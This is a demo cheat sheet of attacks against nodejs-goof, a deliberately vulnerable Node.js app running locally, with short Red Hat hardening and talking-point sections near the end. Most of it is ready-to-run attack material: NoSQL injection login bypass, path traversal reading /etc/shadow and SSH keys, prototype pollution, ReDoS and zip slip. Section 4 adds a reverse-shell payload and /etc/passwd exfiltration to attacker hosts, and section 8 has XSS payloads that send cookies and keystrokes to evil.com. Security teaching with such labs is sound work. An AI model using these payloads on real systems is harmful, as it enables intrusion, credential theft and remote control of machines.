# Attack Reference Guide - Quick Cheat Sheet

## Launch Interactive Menu

```bash
cd /Users/bigmac/Documents/workspace/agbonjaru/personal/projects/nodejs-goof
./attack-menu.sh
```

---

## Available Attacks (10 Categories)

### 1. **NoSQL Injection** - Authentication Bypass (CWE-89)
- **Severity**: Critical (CVSS 9.8)
- **Exploits**: MongoDB query injection
- **Impact**: Complete authentication bypass
- **Demo Steps**:
  1. Failed login with wrong password (401)
  2. Bypass with `{"$gt": ""}` operator (302 redirect)
  3. Blind injection without knowing username

**Manual Command**:
```bash
curl -X POST http://localhost:3001/login -H 'Content-Type: application/json' \
  -d '{"username": "admin@snyk.io", "password": {"$gt": ""}}'
```

---

### 2. **Directory Traversal** - Path Injection (CWE-22)
- **Severity**: High (CVSS 7.5)
- **Exploits**: Unvalidated `layout` parameter in Handlebars
- **Impact**: Read arbitrary files (config, source code, secrets)
- **Demo Steps**:
  1. Authenticate via NoSQL injection
  2. Inject `./../package.json` in layout parameter
  3. View extracted file content

**Manual Command**:
```bash
# Step 1: Login
curl -X POST http://localhost:3001/login -c /tmp/cookies.txt \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin@snyk.io", "password": {"$gt": ""}}'

# Step 2: Exploit
curl -X POST http://localhost:3001/account_details -b /tmp/cookies.txt \
  -H 'Content-Type: application/json' \
  -d '{"email": "admin@snyk.io", "firstname": "admin", "lastname": "admin",
       "country": "IL", "phone": "+972551234123", "layout": "./../package.json"}'
```

---

### 3. **XSS & Open Redirect** - Client-side Attacks (CWE-79, CWE-601)
- **Severity**: Medium (CVSS 6.1)
- **Exploits**: Unescaped template rendering + unvalidated redirects
- **Impact**: Session hijacking, phishing, credential theft

**XSS Example**:
```bash
curl "http://localhost:3001/login?redirectPage=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
```

**Open Redirect Example**:
```bash
curl -I "http://localhost:3001/login?redirectPage=https://evil.com/phishing"
```

---

### 4. **Command Injection** - ImageTragick RCE (CWE-78)
- **Severity**: Critical (CVSS 10.0)
- **Exploits**: Unsanitized input to `exec()` command
- **Impact**: Remote code execution, full system compromise
- **Vulnerable Code**: `exec('identify ' + url)` in routes/index.js:161

**Manual Command**:
```bash
curl -X POST http://localhost:3001/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'content=![alt text](https://example.com/img.png;touch /tmp/pwned "Image")'

# Verify RCE
ls -la /tmp/pwned
```

**Advanced RCE Payloads**:
```bash
# Reverse shell
![alt text](https://x.com/i.png;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 "Image")

# Data exfiltration
![alt text](https://x.com/i.png;cat /etc/passwd | curl -X POST -d @- http://attacker.com "Image")

# Privilege escalation check
![alt text](https://x.com/i.png;id > /tmp/whoami.txt "Image")
```

---

### 5. **Prototype Pollution** - Lodash Exploit (CWE-1321)
- **Severity**: High (CVSS 7.5)
- **Exploits**: `lodash.merge()` vulnerable to __proto__ injection
- **Impact**: Privilege escalation, bypass access controls
- **Vulnerable Code**: `_.merge(message, req.body.message, {...})` in routes/index.js:347

**Attack Flow**:
```bash
# 1. Send normal message (user has no delete permission)
curl -X PUT http://localhost:3001/chat -H 'Content-Type: application/json' \
  -d '{"auth": {"name": "user", "password": "pwd"}, "message": {"text": "Hi"}}'

# 2. Pollute prototype chain
curl -X PUT http://localhost:3001/chat -H 'Content-Type: application/json' \
  -d '{"auth": {"name": "user", "password": "pwd"},
       "message": {"text": "😈", "__proto__": {"canDelete": true}}}'

# 3. Delete message (now works despite being non-admin!)
curl -X DELETE http://localhost:3001/chat -H 'Content-Type: application/json' \
  -d '{"auth": {"name": "user", "password": "pwd"}, "messageId": 1}'
```

---

### 6. **ReDoS** - Regular Expression Denial of Service (CWE-1333)
- **Severity**: High (CVSS 7.5)
- **Exploits**: `ms` package vulnerable regex (exponential backtracking)
- **Impact**: Application hang, CPU exhaustion, DoS
- **Vulnerable Package**: `ms@0.7.1`

**Attack**:
```bash
# Normal request (fast)
curl -X POST http://localhost:3001/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'content=Buy milk in 5 minutes'

# ReDoS attack (causes hang)
curl -X POST http://localhost:3001/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "content=Buy milk in $(printf '%.0s5' {1..50000}) minutea"
```

**Monitoring**:
```bash
# Watch CPU usage spike
top -l 1 | grep "node"
```

---

### 7. **Zip Slip** - Archive Path Traversal (CWE-22)
- **Severity**: High (CVSS 8.1)
- **Exploits**: `adm-zip@0.4.7` doesn't sanitize paths during extraction
- **Impact**: Arbitrary file write, overwrite system files
- **Vulnerable Code**: `zip.extractAllTo(extracted_path, true)` in routes/index.js:257

**Creating Malicious ZIP**:
```bash
# Create file with traversal path
echo "malicious content" > evil.txt
zip evil.zip evil.txt
# Manually edit ZIP to include ../../../../etc/cron.d/backdoor path

# Or use existing exploit
cd exploits/zip-slip
curl -X POST http://localhost:3001/import \
  -F 'importFile=@malicious_backup.zip'

# Check extraction
ls -la /tmp/extracted_files/
find /tmp -name "backup.txt" -mmin -1
```

---

### 8. **XSS via Marked** - Markdown Parser (CVE-2017-17461)
- **Severity**: Medium (CVSS 6.1)
- **Exploits**: `marked@0.3.5` allows XSS via javascript: protocol
- **Impact**: Cookie theft, session hijacking, keylogging
- **Vulnerable Package**: `marked@0.3.5`

**Attack**:
```bash
# Create malicious TODO with XSS link
curl -X POST http://localhost:3001/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'content=[Click Me](javascript:alert(document.cookie))'

# Advanced payload - cookie exfiltration
curl -X POST http://localhost:3001/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'content=[WIN FREE iPHONE!](javascript:fetch("http://attacker.com/?c="+document.cookie))'
```

**Payload Variations**:
```javascript
// Session theft
[Click](javascript:fetch('http://evil.com/?s='+document.cookie))

// Keylogger
[Click](javascript:document.addEventListener('keypress',e=>fetch('http://evil.com/?k='+e.key)))

// Form hijacking
[Click](javascript:document.forms[0].action='http://evil.com/harvest')
```

---

### 9. **Information Disclosure** - ST Directory Traversal (CVE-2015-8858)
- **Severity**: High (CVSS 7.5)
- **Exploits**: `st@0.2.4` static file server allows path traversal
- **Impact**: Read system files (/etc/passwd, SSH keys, source code)
- **Vulnerable Package**: `st@0.2.4`

**Attack Progression**:
```bash
# 1. Normal file access
curl http://localhost:3001/public/about.html

# 2. Directory listing
curl http://localhost:3001/public/

# 3. Path traversal (URL encoded)
curl 'http://localhost:3001/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

# 4. Read sensitive files
curl 'http://localhost:3001/public/%2e%2e/%2e%2e/%2e%2e/etc/shadow'
curl 'http://localhost:3001/public/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa'

# 5. Application source code
curl 'http://localhost:3001/public/%2e%2e/app.js'
curl 'http://localhost:3001/public/%2e%2e/package.json'
```

**Why URL Encoding Works**:
- `%2e` = `.` (dot)
- `%2E` = `.` (capital E variant)
- Browser/WAF filtering bypassed by encoding

---

### 10. **Vulnerability Scanning** - NPM Audit
- **Tool**: Built-in NPM security scanner
- **Finds**: Known CVEs in dependencies
- **Output**: 138 total vulnerabilities

**Commands**:
```bash
# Full report
npm audit

# Production dependencies only
npm audit --production

# JSON output for parsing
npm audit --json

# Summary count
npm audit --json | jq '.metadata.vulnerabilities'

# Attempt auto-fix (may break app)
npm audit fix

# Force fix with breaking changes
npm audit fix --force
```

---

## Additional Attack Vectors

### A. **Hardcoded Secrets** (CWE-798)
- **Location**: `app.js:42`
- **Secret**: `secret: 'keyboard cat'`
- **Impact**: Session forgery

```bash
# Find hardcoded secrets
grep -r "password\|secret\|api_key" . --include="*.js"
```

---

### B. **Insecure Deserialization** (CWE-502)
- **Vector**: Session cookie manipulation
- **Tool**: `node-serialize` vulnerabilities

```bash
# Cookie inspection
curl -v http://localhost:3001/ 2>&1 | grep "Set-Cookie"
```

---

### C. **SQL Injection** (via TypeORM - if MySQL enabled)
- **Requires**: MySQL container running
- **Exploit**: Prototype pollution leads to SQL injection

```bash
# Start MySQL
docker run -p 3306:3306 --rm -e MYSQL_ROOT_PASSWORD=root mysql:5

# Exploit via TypeORM
curl -X POST http://localhost:3001/users \
  -H 'Content-Type: application/json' \
  -d '{"name": "a", "address": {"__proto__": {"where": {"id": "2"}}}}'
```

---

## Red Hat Defensive Measures

### SELinux Confinement
```bash
# Create custom policy for Node.js app
semodule -i nodejs_app.pp

# Set file contexts
semanage fcontext -a -t httpd_sys_content_t "/opt/nodejs-goof(/.*)?"
restorecon -Rv /opt/nodejs-goof

# Audit violations
ausearch -m avc -ts recent | audit2why
```

### Firewalld Rules
```bash
# Restrict to internal network only
firewall-cmd --permanent --zone=internal --add-source=10.0.0.0/8
firewall-cmd --permanent --zone=internal --add-port=3001/tcp
firewall-cmd --permanent --zone=public --remove-service=http
firewall-cmd --reload
```

### Container Security
```bash
# Scan image
podman scan nodejs-goof:latest

# Run with security constraints
podman run --read-only \
  --cap-drop=ALL \
  --security-opt=no-new-privileges:true \
  --tmpfs /tmp:rw,noexec,nosuid,size=100m \
  -p 3001:3001 \
  nodejs-goof:latest
```

### SCAP Compliance Scanning
```bash
# Run OpenSCAP audit
oscap xccdf eval \
  --profile xccdf_org.ssgproject.content_profile_pci-dss \
  --results /tmp/scan-results.xml \
  --report /tmp/scan-report.html \
  /usr/share/xml/scap/ssg/content/ssg-rhel8-ds.xml
```

---

## Demonstration Tips

### For Live Demo:
1. **Start with status check** (`[C]` option)
2. **Show NoSQL injection first** (most impressive)
3. **Demonstrate directory traversal** (show package.json)
4. **Run prototype pollution** (privilege escalation narrative)
5. **End with vulnerability scan** (show 138 vulns)

### Talking Points:
- "These aren't theoretical - actively exploited in the wild"
- "Defense in depth: input validation + output encoding + WAF + monitoring"
- "Red Hat's approach: SELinux + SCAP + Container security"
- "Shift-left: Catch in dev with SAST/SCA tools"

### Recovery Commands:
```bash
# Restart app if it hangs (ReDoS)
pkill -f "node app.js"
npm start &

# Clear test data
mongo express-todo --eval 'db.todos.remove({});'

# Reset cookies
rm /tmp/goof_cookies.txt
```

---

## References

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **CWE Database**: https://cwe.mitre.org/
- **Snyk Vuln DB**: https://snyk.io/vuln/
- **Red Hat Security**: https://access.redhat.com/security/

---

## Quick Start

```bash
# Terminal 1: Start app
cd /Users/bigmac/Documents/workspace/agbonjaru/personal/projects/nodejs-goof
docker run -d -p 27017:27017 --name goof-mongo mongo:3
npm start

# Terminal 2: Run attacks
./attack-menu.sh
```

**Demo Duration**: 15-20 minutes
**Skill Level**: Intermediate to Advanced
**Target Audience**: Security Engineers, DevSecOps, Technical Leadership